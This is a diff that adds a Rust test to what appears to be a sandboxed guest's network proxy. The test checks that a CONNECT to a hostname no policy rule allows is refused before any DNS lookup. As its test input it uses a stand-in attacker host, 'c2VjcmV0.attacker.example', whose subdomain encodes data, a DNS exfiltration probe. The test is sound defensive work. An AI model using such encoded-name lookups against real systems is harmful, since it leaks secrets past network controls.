@@ -693,3 +693,41 @@ async fn a_dbauth_secret_goes_only_to_its_hosts() {
     let past = net_event(&t, &s, 1).await["error"].to_string();
     assert!(!past.contains("isn't for"), "{past}");
 }
+
+/// A CONNECT to a name no rule could allow is refused before the name is
+/// looked up on the host, even when a rule with a path makes every
+/// connection inspected (so decided per request): else any name the guest
+/// made up, data encoded in it, would reach the host's resolver, which the
+/// DNS resolver refuses. A name a rule allows gets past it.
+#[tokio::test]
+async fn an_inspected_connect_to_a_name_nothing_allows_is_not_looked_up() {
+    let t = TestCore::new(
+        "profiles:\n  web:\n    policy:\n      net:\n        - { action: allow, host: ok.example }\n        - { action: deny, host: \"*\", path: \"/admin/**\" }\n      defaults: { net: deny }\n",
+    );
+    let s = session(&t);
+    let connect = |host: &'static str| {
+        let (d, s) = (t.core.daemon().clone(), s.clone());
+        async move {
+            let (mut guest, host_side) = tokio::net::UnixStream::pair().unwrap();
+            tokio::spawn(super::serve(d, s, host_side));
+            guest
+                .write_all(
+                    format!("CONNECT {host}:443 HTTP/1.1\r\nHost: {host}:443\r\n\r\n").as_bytes(),
+                )
+                .await
+                .unwrap();
+            let mut reply = vec![0u8; 512];
+            let n = tokio::io::AsyncReadExt::read(&mut guest, &mut reply)
+                .await
+                .unwrap();
+            String::from_utf8_lossy(&reply[..n]).into_owned()
+        }
+    };
+    let refused = connect("c2VjcmV0.attacker.example").await;
+    assert!(refused.starts_with("HTTP/1.1 403"), "{refused}");
+    assert!(refused.contains("no rule allows this name"), "{refused}");
+    // Allowed: past the check, to the host's resolver (which this test
+    // doesn't have).
+    let allowed = connect("ok.example").await;
+    assert!(!allowed.contains("no rule allows"), "{allowed}");
+}
